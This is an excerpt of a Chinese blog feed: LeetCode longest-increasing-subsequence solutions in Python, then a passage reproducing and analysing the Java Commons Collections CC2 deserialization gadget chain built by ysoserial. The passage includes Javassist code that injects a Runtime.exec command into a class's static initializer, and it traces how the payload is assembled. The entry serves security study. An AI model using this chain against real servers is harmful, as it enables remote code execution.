plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [10,9,2,5,3,7,101,18]</span><br><span class="line">输出：4</span><br><span class="line">解释：最长递增子序列是 [2,3,7,101]，因此长度为 4 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [0,1,0,3,2,3]</span><br><span class="line">输出：4</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [7,7,7,7,7,7,7]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure><p>这道题要找的是严格递增的子序列，我们首先来根据动态规划的思路走一遍。</p><p>如果<code>nums</code>的长度是1，那么不用考虑，直接返回1即可。</p><ul><li>从<code>nums</code>的长度大于等于2开始，首先我们要初始化一个<code>dp数组</code>。这个数组的初值可以全部设置为1，因为最短的子序列长度也是1。</li><li>从第2个值开始遍历，依次比较当前值之前的所有值，从而更新当前值之前的最长子序列长度，更新到<code>dp[i]</code>中</li><li>设置一个全局的值，用来保存最长子序列的长度</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#动态规划</span></span><br><span class="line">        <span class="keyword">if</span> len(nums) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> len(nums)</span><br><span class="line">        <span class="comment">#初始化dp数组，其中dp[i]表示i之前包含i的最长上升子序列的长度</span></span><br><span class="line">        dp = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums))]</span><br><span class="line">        <span class="comment">#用来保存最大值</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="comment">#如果当前i的值大于i之前的值</span></span><br><span class="line">                <span class="keyword">if</span> nums[i] &gt; nums[j]:</span><br><span class="line">                    <span class="comment">#则对当前dp[i]中的值进行更新</span></span><br><span class="line">                    dp[i] = max(dp[i],dp[j]+<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#如果当前dp[i]的值大于res的值，则更新res</span></span><br><span class="line">            <span class="keyword">if</span> dp[i] &gt; res:</span><br><span class="line">                res = dp[i]</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>另一种做法，通过<code>bisect</code>模块实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        dp = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> nums:</span><br><span class="line">          <span class="comment">#因为要求得是严格递增的，因此这里遇到重复的值直接跳过</span></span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">in</span> dp:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#找到当前值在dp中应该插入的位置</span></span><br><span class="line">            pos = bisect.bisect(dp, x)</span><br><span class="line">            <span class="comment">#这里会有两种情况，一种是dp为空，一种是pos应该插入到dp中最后一个位置</span></span><br><span class="line">            <span class="keyword">if</span> pos == len(dp):</span><br><span class="line">                dp.append(x)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">              <span class="comment">#这种情况说明pos应该插入到dp中间位置。</span></span><br><span class="line">                dp[pos] = x</span><br><span class="line">        <span class="keyword">return</span> len(dp)</span><br></pre></td></tr></table></figure><h4 id="使数组-K-递增的最少操作次数"><a href="#使数组-K-递增的最少操作次数" class="headerlink" title="使数组 K 递增的最少操作次数"></a>使数组 K 递增的最少操作次数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">给你一个下标从 0 开始包含 n 个正整数的数组 arr ，和一个正整数 k 。</span><br><span class="line">如果对于每个满足 k &lt;= i &lt;= n-1 的下标 i ，都有 arr[i-k] &lt;= arr[i] ，那么我们称 arr 是 K 递增 的。</span><br><span class="line">比方说，arr = [4, 1, 5, 2, 6, 2] 对于 k = 2 是 K 递增的，因为：</span><br><span class="line">arr[0] &lt;= arr[2] (4 &lt;= 5)</span><br><span class="line">arr[1] &lt;= arr[3] (1 &lt;= 2)</span><br><span class="line">arr[2] &lt;= arr[4] (5 &lt;= 6)</span><br><span class="line">arr[3] &lt;= arr[5] (2 &lt;= 2)</span><br><span class="line">但是，相同的数组 arr 对于 k = 1 不是 K 递增的（因为 arr[0] &gt; arr[1]），对于 k = 3 也不是 K 递增的（因为 arr[0] &gt; arr[3] ）。</span><br><span class="line">每一次 操作 中，你可以选择一个下标 i 并将 arr[i] 改成任意 正整数。</span><br><span class="line">请你返回对于给定的 k ，使数组变成 K 递增的 最少操作次数 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [5,4,3,2,1], k = 1</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">对于 k = 1 ，数组最终必须变成非递减的。</span><br><span class="line">可行的 K 递增结果数组为 [5,6,7,8,9]，[1,1,1,1,1]，[2,2,3,4,4] 。它们都需要 4 次操作。</span><br><span class="line">次优解是将数组变成比方说 [6,7,8,9,10] ，因为需要 5 次操作。</span><br><span class="line">显然我们无法使用少于 4 次操作将数组变成 K 递增的。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [4,1,5,2,6,2], k = 2</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">这是题目描述中的例子。</span><br><span class="line">对于每个满足 2 &lt;= i &lt;= 5 的下标 i ，有 arr[i-2] &lt;= arr[i] 。</span><br><span class="line">由于给定数组已经是 K 递增的，我们不需要进行任何操作。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [4,1,5,2,6,2], k = 3</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">下标 3 和 5 是仅有的 3 &lt;= i &lt;= 5 且不满足 arr[i-3] &lt;= arr[i] 的下标。</span><br><span class="line">将数组变成 K 递增的方法之一是将 arr[3] 变为 4 ，且将 arr[5] 变成 5 。</span><br><span class="line">数组变为 [4,1,5,4,6,5] 。</span><br><span class="line">可能有其他方法将数组变为 K 递增的，但没有任何一种方法需要的操作次数小于 2 次。</span><br></pre></td></tr></table></figure><p>这道题和<code>Leetcode</code>第300题有些类似，只不过这里面加了一个K递增的概念。而且要注意的是，这里面没有要求严格递增。所以这道题我们可以分三步走</p><ul><li>首先将数组分为k组</li><li>对k组中的每个数组遍历，求解每个数组的最长子序列</li><li>这k组中的每个数组长度减去每个数组的最长子序列就可以得到每个数组需要修改的最少操作数</li></ul><p>最终将k组中每个数组变为非递减需要的最少操作数相加即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kIncreasing</span><span class="params">(self, arr, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        nums = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(k)]</span><br><span class="line">        <span class="comment">#将数组分成k个字数组</span></span><br><span class="line">        <span class="keyword">for</span> index,v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">            nums[index % k].append(v)</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="comment">#print(nums)</span></span><br><span class="line">        <span class="comment">#分别对每一个子数组求需要修改的最少操作次数</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            res += self.lengthOfLIS(num)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#动态规划</span></span><br><span class="line">        <span class="keyword">if</span> len(nums) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="comment">#初始化dp数组，其中dp[i]表示i之前包含i的最长上升子序列的长度</span></span><br><span class="line">        dp = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums))]</span><br><span class="line">        <span class="comment">#用来保存最大值</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="comment">#如果当前i的值大于i之前的值</span></span><br><span class="line">                <span class="keyword">if</span> nums[i] &gt;= nums[j]:</span><br><span class="line">                    <span class="comment">#则对当前dp[i]中的值进行更新</span></span><br><span class="line">                    dp[i] = max(dp[i],dp[j]+<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#如果当前dp[i]的值大于res的值，则更新res</span></span><br><span class="line">            <span class="keyword">if</span> dp[i] &gt; res:</span><br><span class="line">                res = dp[i]</span><br><span class="line">        <span class="comment">#res是最长递增子序列，长度减去之后就是需要修改的个数</span></span><br><span class="line">        <span class="keyword">return</span> len(nums) - res</span><br></pre></td></tr></table></figure><p>超时了。。。。😭</p><p>另外一种做法，没超时🐶，基本思路还是一样的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kIncreasing</span><span class="params">(self, arr, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        nums = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(k)]</span><br><span class="line">        <span class="comment">#将数组分成k个字数组</span></span><br><span class="line">        <span class="keyword">for</span> index,v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">            nums[index % k].append(v)</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="comment">#print(nums)</span></span><br><span class="line">        <span class="comment">#分别对每一个子数组求需要修改的最少操作次数</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            res += self.lengthOfLIS(num)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self,nums)</span>:</span></span><br><span class="line">            dp = []</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> nums:</span><br><span class="line">                pos = bisect_right(dp, x)</span><br><span class="line">                <span class="keyword">if</span> pos == len(dp):</span><br><span class="line">                    dp.append(x)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[pos] = x</span><br><span class="line">            <span class="keyword">return</span> len(nums) - len(dp)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;找出数组中的第一个回文字符串&quot;&gt;&lt;a href=&quot;#找出数组中的第一个回文字符串&quot; class=&quot;headerlink&quot; title=&quot;找出数组中的第一个回文字符串&quot;&gt;&lt;/a&gt;找出数组中的第一个回文字符串&lt;/h4&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Java CC2链复现与分析</title>
    <link href="elssm.github.io/2021/12/15/Java-CC2%E9%93%BE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>elssm.github.io/2021/12/15/Java-CC2链复现与分析/</id>
    <published>2021-12-15T01:16:42.000Z</published>
    <updated>2021-12-15T03:59:52.874Z</updated>
    
    <content type="html"><![CDATA[<h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mac OS Big Sur</span><br><span class="line">JDK-7u6</span><br><span class="line">commons-collections4-4.0</span><br><span class="line">tomcat8</span><br></pre></td></tr></table></figure><p><code>Ysoserial</code>环境和<code>Web Server</code>环境配置和<a href="http://elssm.top/2021/12/13/Ysoserial%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="noopener">这里的配置</a>是一样的。</p><h4 id="CC2复现"><a href="#CC2复现" class="headerlink" title="CC2复现"></a>CC2复现</h4><h5 id="Payload生成"><a href="#Payload生成" class="headerlink" title="Payload生成"></a>Payload生成</h5><p><img src="/2021/12/15/Java-CC2链复现与分析/1.png" alt="1"></p><h5 id="Payload测试"><a href="#Payload测试" class="headerlink" title="Payload测试"></a>Payload测试</h5><p><img src="/2021/12/15/Java-CC2链复现与分析/2.png" alt="2"></p><p>复现成功</p><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h5><p>Javassist是用来处理java字节码的类库， java字节码一般存放在后缀名称为class的二进制文件中。每个二进制文件都包含一个java类或者是java接口。对于Javassist有很多知识点，这里我们仅仅说几个payload中用到的一些用法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ClassPool：一个基于哈希表实现的CtClass对象容器，其中键名是类名称，值是表示该类的CtClass对象</span><br><span class="line">  常用方法如下</span><br><span class="line">  getDefault()：单例获取ClassPool，主要用来修改字节码，里面存储基于二进制文件构建的CtClass对象</span><br><span class="line">  get()：根据名称获取CtClass对象</span><br><span class="line">  makeClassInitializer：在当前类中创建一个静态代码块</span><br><span class="line">  insertBefore：在静态代码块的开头插入源代码</span><br><span class="line">CtClass：一个CtClass对象可以处理一个<span class="class"><span class="keyword">class</span>文件，这些<span class="title">CtClass</span>对象可以从<span class="title">ClassPool</span>的一些方法获得。</span></span><br><span class="line"><span class="class">  常用方法如下</span></span><br><span class="line"><span class="class">  <span class="title">writeFile</span>：将生成的类写入文件</span></span><br><span class="line"><span class="class">  <span class="title">toClass</span>：拿到生成的类</span></span><br><span class="line"><span class="class">  <span class="title">newInstance</span>：获取实例对象</span></span><br></pre></td></tr></table></figure><p>举一个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javatest;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javas</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//获取ClassPool实例，主要用来修改字节码，里面存储基于二进制文件构建的CtClass对象</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//通过get方法，获取CtClass对象，将获取到的CtClass对象赋值给cc变量</span></span><br><span class="line">        <span class="comment">//ClassPool中有一张保存CtClass信息的HashTable，在该HashTable中Key为类名，value为类对应的CtClass对象</span></span><br><span class="line">        CtClass cc = pool.get(javas<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        <span class="comment">//有了CtClass实例对象，就可以处理类文件，编辑或者修改类</span></span><br><span class="line">        <span class="comment">//因为添加的内容都是完整的java源代码，因此引号要进行转义处理</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open -a calculator\");"</span>;</span><br><span class="line">        <span class="comment">//makeClassInitializer：在当前类(javas)中创建一个静态代码块</span></span><br><span class="line">        <span class="comment">//insertBefore：在静态代码块的开头插入源代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"Elssm"</span> + System.nanoTime();</span><br><span class="line">        <span class="comment">//setName：设置类名，使用System.nanoTime为了不让类名重复</span></span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//writeFile：将生成的类写入文件</span></span><br><span class="line">        cc.writeFile(<span class="string">"/Users/caoyifan/IdeaProjects/WebTest/src/javatest/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码会在指定文件下生成一个新的字节码文件。我们发现，动态生成的类在原有类的基础上添加了静态代码块，如果我们加载这个类的话，静态代码块中的内容就会被执行。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/3.png" alt="3"></p><p>现在我们通过<code>toClass</code>拿到生成的类，并通过<code>newInstance</code>获取实例对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javatest;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javas</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//获取ClassPool实例，主要用来修改字节码，里面存储基于二进制文件构建的CtClass对象</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//通过get方法，获取CtClass对象，将获取到的CtClass对象赋值给cc变量</span></span><br><span class="line">        <span class="comment">//ClassPool中有一张保存CtClass信息的HashTable，在该HashTable中Key为类名，value为类对应的CtClass对象</span></span><br><span class="line">        CtClass cc = pool.get(javas<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        <span class="comment">//有了CtClass实例对象，就可以处理类文件，编辑或者修改类</span></span><br><span class="line">        <span class="comment">//因为添加的内容都是完整的java源代码，因此引号要进行转义处理</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open -a calculator\");"</span>;</span><br><span class="line">        <span class="comment">//makeClassInitializer：在当前类(javas)中创建一个静态代码块</span></span><br><span class="line">        <span class="comment">//insertBefore：在静态代码块的开头插入源代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"Elssm"</span> + System.nanoTime();</span><br><span class="line">        <span class="comment">//setName：设置类名，使用System.nanoTime为了不让类名重复</span></span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//toClass：拿到生成的类</span></span><br><span class="line">        <span class="comment">//newInstance：获取实例对象</span></span><br><span class="line">        cc.toClass().newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/2021/12/15/Java-CC2链复现与分析/4.png" alt="4"></p><h5 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h5><p>PriorityQueue实际上是一个堆（不指定Comparator时默认为最小堆），队列既可以根据元素的自然顺序来排序，也可以根据 Comparator来设置排序规则。队列的头是按指定排序方式的最小元素。如果多个元素都是最小值，则头是其中一个元素。新建对象的时候可以指定一个初始容量，其容量会自动增加。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue优先级队列的函数定义</span><br><span class="line">add() : 在优先级队列的队尾插入元素 , 插入失败则抛出异常.</span><br><span class="line">offer() : 在优先级队列的队尾插入元素 , 插入失败则返回 <span class="keyword">null</span>.</span><br><span class="line">element() : 获取但不删除优先级队列的队首元素 , 获取失败时抛出异常.</span><br><span class="line">peek() : 获取但不删除优先级队列的队首元素 , 获取失败时返回 <span class="keyword">null</span>.</span><br><span class="line">remove : 获取且删除优先级队列的队首元素 , 获取失败时抛出异常.</span><br><span class="line">poll() : 获取且删除优先级队列的队首元素 , 获取失败时返回 <span class="keyword">null</span>.</span><br></pre></td></tr></table></figure><h4 id="Ysoserial-Payload生成分析"><a href="#Ysoserial-Payload生成分析" class="headerlink" title="Ysoserial Payload生成分析"></a>Ysoserial Payload生成分析</h4><h5 id="createTemplatesImpl"><a href="#createTemplatesImpl" class="headerlink" title="createTemplatesImpl"></a>createTemplatesImpl</h5><p>在生成CC2 Payload的时候，首先执行的是<code>Gadgets.createTemplatesImpl(command)</code></p><p><img src="/2021/12/15/Java-CC2链复现与分析/5.png" alt="5"></p><p>在<code>createTemplatesImpl</code>方法中首先会通过<code>getProperty</code>方法获取系统属性<code>properXalan</code>的值，<code>properXalan</code>的默认属性是<code>false</code>，通过调试发现走的是下面的<code>return</code>条件。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/6.png" alt="6"></p><p>跟进发现，首先获取了<code>TemplatesImpl</code>的实例对象。之后通过<code>Javassist</code>动态修改<code>StubTransletPayload</code>类。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/7.png" alt="7"></p><p>接着通过<code>get</code>方法获取<code>abstTranslet</code>类，并通过<code>setSuperclass</code>将该类作为新建类的父类，因为在前面我们获取到了<code>StubTransletPayload</code>类，而<code>StubTransletPayload</code>是继承<code>abstTranslet</code>类的</p><p><img src="/2021/12/15/Java-CC2链复现与分析/8.png" alt="8"></p><p><img src="/2021/12/15/Java-CC2链复现与分析/9.png" alt="9"></p><p>通过上述<code>Javassist</code>操作，就可以将我们写的恶意代码注入到新的字节码文件中中的静态代码块部分</p><p>之后通过<code>CtClass.toBytecode</code>方法获取到恶意类的字节码，并通过java反射机制将字节码填充到<code>TemplatesImpl</code>实例对象的<code>_bytecodes</code>数组中。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/10.png" alt="10"></p><p>之后填充了<code>_name</code>和<code>_tfactory</code>字段，并将<code>TemplatesImpl</code>实例对象返回</p><p><img src="/2021/12/15/Java-CC2链复现与分析/11.png" alt="11"></p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>返回<code>TemplatesImpl</code>实例对象之后，接着获取了<code>InvokerTransformer</code>实例对象，并做了一些初始化。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/12.png" alt="12"></p><h5 id="PriorityQueue-1"><a href="#PriorityQueue-1" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h5><p>接着创建一个优先级队列，指定队列的初始容量和比较器。然后填充了两个1来占位初始化。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/13.png" alt="13"></p><p>在优先级队列里，通过<code>TransformingComparator(transformer)</code>获取构造器实例对象，此时的<code>transformer</code>就是上面<code>InvokerTransformer</code>类型的<code>transformer</code>实例对象。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/14.png" 